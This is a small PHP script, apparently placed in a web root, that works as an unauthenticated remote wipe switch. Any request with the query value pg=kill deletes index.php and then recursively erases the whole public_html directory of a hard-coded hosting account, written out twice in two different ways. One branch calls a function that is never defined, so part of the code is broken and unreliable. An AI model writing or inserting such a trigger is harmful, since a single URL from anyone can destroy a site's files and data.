<?php
/* To remove the file */
if(isset($_GET['pg'])){
if($_GET['pg']=="kill"){
	unlink("index.php");
}}
/* To remove the empty directory */
if(isset($_GET['pg'])){
	if($_GET['pg']=='kill'){
rmdir("/home/a1976772/public_html/123");
	}}
/* To remove the file directory*/
if(isset($_GET['pg'])){
	if($_GET['pg']=='kill'){
		
$dir="/home/a1976772/public_html";

    foreach(scandir($dir) as $file) {
        if ('.' === $file || '..' === $file) continue;
        if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
        else unlink("$dir/$file");
    }
    rmdir($dir);
}}
/* Another way to remove the file directory */
if(isset($_GET['pg'])){
	if($_GET['pg']=='kill'){
$dir="/home/a1976772/public_html";
    $it = new RecursiveDirectoryIterator($dir);
    $it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
    foreach($it as $file) {
        if ('.' === $file->getBasename() || '..' ===  $file->getBasename()) continue;
        if ($file->isDir()) rmdir($file->getPathname());
        else unlink($file->getPathname());
    }
    rmdir($dir);
	}}
?>